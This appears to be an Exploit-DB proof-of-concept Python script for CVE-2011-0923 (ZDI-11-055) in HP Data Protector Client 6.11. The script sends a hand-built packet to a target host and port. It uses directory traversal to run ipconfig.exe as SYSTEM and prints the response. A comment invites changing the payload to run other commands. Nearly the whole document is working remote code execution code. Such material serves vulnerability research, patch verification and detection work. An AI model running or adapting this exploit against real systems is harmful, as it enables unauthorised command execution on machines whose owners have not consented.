# Exploit Title: HP Data Protector Client EXEC_CMD Remote Code Execution Vulnerability PoC (ZDI-11-055)
# Date: 2011-05-28
# Author: @fdiskyou
# e-mail: rui at deniable.org
# Version: 6.11
# Tested on: Windows 2003 Server SP2 en
# CVE: CVE-2011-0923
# Notes: ZDI-11-055
# Reference: http://www.zerodayinitiative.com/advisories/ZDI-11-055/
# Reference: http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02781143
#
# Greetz to all the Exploit-DB Dev Team.

import socket
import sys

if len(sys.argv) != 3:
    print "Usage: ./ZDI-11-055.py <Target IP> <Port>"
    sys.exit(1)

host = sys.argv[1]
port = int(sys.argv[2])

# The following PoC takes advantage of a Directory Path Traversal to execute ipconfig.exe on the remote host. 
# Tweak payload to better suit your needs.
payload = (
"\x00\x00\x00\xa4\x20\x32\x00\x20\x66\x64\x69\x73\x6b\x79\x6f\x75"
"\x00\x20\x30\x00\x20\x53\x59\x53\x54\x45\x4d\x00\x20\x66\x64\x69"
"\x73\x6b\x79\x6f\x75\x00\x20\x43\x00\x20\x32\x30\x00\x20\x66\x64"
"\x69\x73\x6b\x79\x6f\x75\x00\x20\x50\x6f\x63\x00\x20\x4e\x54\x41"
"\x55\x54\x48\x4f\x52\x49\x54\x59\x00\x20\x4e\x54\x41\x55\x54\x48"
"\x4f\x52\x49\x54\x59\x00\x20\x4e\x54\x41\x55\x54\x48\x4f\x52\x49"
"\x54\x59\x00\x20\x30\x00\x20\x30\x00\x20\x2e\x2e\x2f\x2e\x2e\x2f"
"\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x2e"
"\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x5c\x77\x69\x6e\x64\x6f\x77\x73"
"\x5c\x73\x79\x73\x74\x65\x6d\x33\x32\x5c\x69\x70\x63\x6f\x6e\x66"
"\x69\x67\x2e\x65\x78\x65\x00\x00")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
print "Sending payload"
s.send(payload)

while 1:
        data = s.recv(4096)
        if data:
                print data
        else:
                break

s.close()